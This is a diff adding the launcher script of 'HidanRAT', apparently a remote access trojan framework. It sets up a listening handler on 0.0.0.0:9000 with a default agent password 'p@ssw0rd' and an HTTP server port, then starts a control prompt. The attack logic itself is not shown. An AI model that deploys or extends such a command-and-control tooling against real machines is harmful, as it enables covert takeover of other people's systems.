@@ -1,0 +1,27 @@
+#!/usr/bin/env python3.6
+# -*- coding: utf-8 -*-
+from logging import getLogger,ERROR
+getLogger('scapy.runtime').setLevel(ERROR)
+import argparse
+import sys
+from PyQt4 import QtGui
+from core.main import FrameworkBash
+from core.utility.printer import banner, setcolor
+from core.packets.dhcpserver import IpAddressClass
+
+_author  = ('{}'.format(setcolor('@mh4x0f',color='yellow')))
+_version = setcolor('0.1',color='yellow')
+banner()
+if __name__ == '__main__':
+    app = QtGui.QApplication(sys.argv)
+    parser = argparse.ArgumentParser(description="HidanRAT - Remote Administration Tool")
+    parser.add_argument('-l',  dest='host',help='set handler connection',default='0.0.0.0')
+    parser.add_argument('-p',  dest='port',type=int,help='Port connection',default='9000')
+    parser.add_argument('-c',  dest='password',help='Password the agents',default='p@ssw0rd')
+    parser.add_argument('-s',  dest='httpport',help='Server HTTP port defualt:8000',default='8000')
+    parser.add_argument('-v','--version', action='version', dest='version',version='%(prog)s v{}'.format(_version))
+    prompt = FrameworkBash(parser.parse_args())
+    print('Author: {} P0cL4bs Team'.format(_author))
+    print('Version: {} dev'.format(_version))
+    prompt.cmdloop('Starting prompt...')
+    sys.exit(app.exec_())
